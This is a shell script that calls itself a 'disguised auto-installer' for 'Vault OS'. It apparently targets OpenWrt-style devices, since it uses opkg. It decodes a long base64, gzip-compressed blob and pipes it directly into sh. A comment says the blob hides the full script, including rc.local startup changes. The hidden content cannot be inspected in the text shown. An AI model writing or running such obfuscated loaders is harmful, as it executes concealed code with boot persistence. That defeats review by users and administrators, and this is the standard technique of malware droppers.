#!/bin/sh
# ===================================================================
# ANONIMO'S VAULT OS - DISGUISED AUTO-INSTALLER
# ===================================================================

echo "====================================================="
echo "  INITIALIZING VAULT OS ECOSYSTEM..."
echo "====================================================="

if ! command -v base64 >/dev/null 2>&1; then
    echo "Installing decoding dependencies..."
    opkg update >/dev/null 2>&1
    opkg install coreutils-base64 >/dev/null 2>&1
fi

# Your entire script (including rc.local and vaultos_core.sh) is hidden here:
PAYLOAD="H4sICBwmomoAA2luc3RhbGwuc2gAtVrbchu5EX3nV7RGjk0mnuHFomNLpHZpamSzliJV5GiVjXej
Gs6AJKy5LQCKor16zAekKm9JVZ7yY/mCfEK6McPhxbR8DSWRQ6DR3WicBg4A7e+VRzwqy2lhH5pf
/0ItrV6/1znrPxrCj62LrgP9IZjQ79lmu9tp/wCd3tBpdbv24BsZLDBvGoPxRY2NrDGgVx2n0+p2
/tzpvVz5nfnacjr9nmVZxtfZylq/rpbrv8BF4ruKRxPoJyy6FAoS17t2J0yCG/nAI6ncIKD681fn
2nScXE9gRq1Y+pzJQDJNnuk305vw9CGMfVMyKXkcrQreSPzmzUQA8wlTppQBKFeAF0eREmg8969G
/rXjaMwnM0EuzF45zrkPl2wEQyZumIBxLGDQOjNPuLzW3s08DpIpmE2VSnwrdHlkTeOQNR+VVZiU
pyoMHu0U4pHPbq8S7HnzkX620OHdokyIWGSi5S1Z1/evAi63dSsmEsHwvfmIZJvlmRQa7/iFwpU2
9uIw5MumeRieUBguBdejdMoFm1O07WjCIwbFG3cWqFheebFglpyWdBQ8V0GjAY/s/umVBtEjOIYy
U155S7ywv5Z2uxPm3O5dDhzonTqtF117CO3+wF769iNpIzkeoXtuwN+ij9oDVPfff/3933Da+RNU
D+HloNVz4NJ+AUN78KM9gHN7cNYZDhHP4PRRZ88Z9LsoPbAvEei6bcGbIlzgDxJ0tCT5GY0V1I7L
PrspR7Mg2CWS42hDEP2pWnAazOQU4sAHVOSOAkS5mOF7gfT6LMARAl2OHcJBT7iM53zMtzXVLGgL
5pLwlME5SsElP+Xg6KaUN2etNkJUpYoRE7u05nWEr0177gwVR4rjODL/KnQ9Ce9ALRIGDCvEFbYS
Px/B3T0q5lwm97XEbjzBbriJ4jfYh1hgDsOA+YgvT1G+Fnstp5Qb8KYI5C0TXtr4KkkbZ3YixN40
jq8BAS/imUZtIniMAF6ALxXVm1BFJ5I44N4CXM9jiUqdWpqjUbnfmu4OSOoPfL8jXphtMxF9qcJV
9D5bD0/A10qqFYt+ql+ggo8jN2RgjIQ5mTGpDFAeqqVqeFZBhekwgYrh8Fnl6zTP/KXm+pNNzfUn
38rnHZoRfwcWdGhmJLUvgti7JqgUT2Mxd4WPz/ejb8wDbHs1TsWX6EtLUwAuq3L0ZZUfRB/NWf/4
GzivbDjrn9hncD7oO3bb6Q90xX3R2PJmRzRWuHhes6pPn1lVhIYv4uQbq63VD+gvVf0Zuj+WUGmg
vlThKqE+W8+9yDo4IGi9IWDNuZrqGsFwOvw6A2nw1vAw6F84tGzlgCh2eucXDrRftTq90iY87kEr
j5KZ2oXVtOJTkfrxvqX67g1drfap8PsEZTQOy6DVLegxNY/FNbQQQ6ajkaCT23G6pYw7tJIkWFAh
lm3LBRx5kNygMkg/UVDzGCJyiSsku1IqIDpVaHxH7w/QXQZNMHKqV/ZH5RGux3Puq6lFxNM4KjzA
Vij19OCowMdFanPFbpGyyaJWUCq9KwC+HozmKEVtrnzmxT5LRZGyInnCaSvKGzwGJWasdKSboUou
EX9FbP/aQFPGL6USZDaLyARLq4qjwl0aDKo+Knx3XEh7WcA/5G3d5oNixg/B/HVHv0sFEe4o3qAr
r8F8C8aDTKMBv8DDh7DU//SgcC9qQzeaBDTFS7Vcyndgd706R3DaFLbhCx/D7w6T8c5ZjyJKtGfZ
NULeUwspjFTIbeGyMzyH4WwkPcFHTMgMdWk1ad0W2EYb1W/BjSaxj+JNpioTIlFyibl7gUYtvhBq
um2mh144pTHXm6bl4Ep4wH1oHqONNaFNmMrXBu7f1EwiUAkb6wW0MQbD9WihN0qwqWLT3muDZnds
QkbxcZd0ahiKeyxM1KKoxUqgBwZHW8VBPGeiqAQPszrL+Jmit63jrrD7W/p0h1mVphINYWF3Bi2H
En6DiWAJmNwG4y/F1xXzuWuOf3lXuzssvavfrX1/YCzBkMbjikJsqVtVKMynBASMhA+mIO5/BH6c
DRFgAkaYgFiKyXdEO4Yod3iZB7jzCHGU76Hw1B7uNjJbx58X/Bi3gY0PeLYPf1ylRMtLuX6+Xxmm
W/P3c+ODkttJMrSHw60kof3+x5Nkqe+T8iMT/uIcydrvzJOl7gy2/89k+TygfxjWFPQPwHoZ/K+B
9XJodkB7eLUb3Lr8c+G9c5Obqvp0pG84u7ka5im+Kz670uWDmrf3/89w4xwwV9DhVHZmtTp1ME/X
xeG33zQcqdlzC4bKRbJEpwZnrqQF9MRlYRwVrnkQZGdoelTXDW6fFeVDniaTVqD7hOOYm60dP6zC
w/ycJjvPOVwd49i9l52eDa3BmX2COZ2fFOXHTgd07NSJiFrTlPAijhVOA7/OWOQxKArPwh2bG7x/
3jRod/vtVjc/cVpKpicwnTO012k5dvcnaA9sfKDzOzjpDH+Ah9A/Pe2SV+etl3YhvMYdI5jJqrPr
dvJZR0chP4UrNPZO+m3np3MbqOK40KAPCJBVNA0WGVSAYD7WmGqETLlEfBAaqmlcOKfmM2O9imhH
07jhbE4k14BspmkamlA2MdrcY6b+8nh5BmZK7CxrVq3KYyQztzychetFM8mE/k4HQs0oXtpTXAXs
eLhAVITQH48DTJZGOS1NJaRaLJ/pNYr9BSbMCDE3QaYU+aaH84o4hP1KveJW60c4yUXKHLshDxaH
uA+LpIm2+RjzFzMjcLFwHLDbI/1u5gc/h9jLYBZGR+AGfBKZHB2SWMhoq34Eb2ZS8fHCzEKxqpgy
Ppni92qlcjM9wq6LCUdlFSSAOAcghA6hVknQnGK3ytS6V41Xk52FW7IIpc1RfLuzewsW4PS5pRWe
aNWjWPgMZQ6wRCLt9OnYYVlsCtfnM0kekmzqIJpRKg5RSz1VcGvKqevHc/Qcf7RuMRm5xVq9/hgq
6a9VL224PMLBosMLk7qGTmeeatt6ECR/y9CEYGFWMM+C9bxS2QiVG/HQTUdBK4WqxBWDJSbTh/Fj
whhbt/39NVuMBcJUZg3eQb3yO3yPE9dDHq613q07G8rJysV9z/M2fKxaVe0lwc/Mh9Sqvxevqo7X
ml7XD3H/sNI8Ho+3OjuKA3/LWBqSLdUHlS3VIxXtRnqtVjvaNLhEQC1HwH69Xl9DC/mdWdjhyQ5/
t8BTzyFMNERkgxXh0pQV4yoQSeQX2JFZkjDhuTIfsUZ5LYkb6TZhldHlMrRmKjYFGwsmp8BumFhA
HXc5mGy+pJMzb8pwicGFNz95nyJxIVjIKfNxYZ5HQexST3OtOLU5PGS4lyoWS0Rv3iGxjFBST8vk
viUYNSqmtAnuHiOEKpWMQKHLmZuNcjpzNmjmybrg8xvwAldKnBJXeWus+tRIlvUbSWIc9/rQ6Tn2
oGc7cGLToYp9stcoJ5niMmpOHwubahC+xvE5rr6SZdEYizgEhV2kAOlPuhWiNZYuX4DuaaiGumg1
RuLYmbqYJ4t4puXwUwBiCneAyo0octbKi9yqBrdxbGZXJENonZx1erlgKu3CFIeuaZSNvM8KGw3s
04E9fKUXtUbZpUCmEWyU0yUKV7PsVmFw0YOT/mWv22+dLFfoTg9etNo/vBz0L3onUBzGQPtiuvtK
Rx0TH5dmfVxa1H7sw6XLle6ccOfAl0esxdEiQa+wwUlvCEhocStd0i1SkreH1AwXetODKpiX+PbM
0j/v8QoigCADhvyyTs8RWwUhM16t5KhdDkbmNY6EXEQecCUxSjGOH40a1id0bIckcYHESqtKLVQr
68rz8+IxzQN7cJIBfpUPdPuCAEMqhnwTS+iyidTH6ZKq4ZB2GrcOYJpRbGoYmR4TuLBpNooMq5+x
Rn24bSFrsyZvwaCLOXlYLmNcrQlX09mIlvNsKbS8OCzLa1WtvSm7OCHwMJZlguCmFkNbpxtP8/bt
eJcZs71GeUg457XrYoUsJPqardVzOuaLAUKnf+Fk13cIOqc/sNO7tFS2HSeLNNhMhG5E4aZZdZbo
D4JKOhZEyZAkXMOI0U4JlyCkrQQOqhxnV5B7WumKpQmEYXq/eJUq3apf2//pGi+hLcX7zcq/35At
v7cVyDqz4tL54G/djmrBndeeJc2NbxEglcIaac3Jb53I75B56b3zOUaLL/eJiK/O9m1ndg15u9vY
Zm3Oh++L3Df5Z4L//POv7/0LgX0Cw4t2G3eQpxfd7k97ubCzStE5bkZwRZsjgaGphRLUpcPaJTRM
gsbX/hNCqrvwP/fZern3IQAA"

echo "$PAYLOAD" | base64 -d | gunzip | sh

exit 0
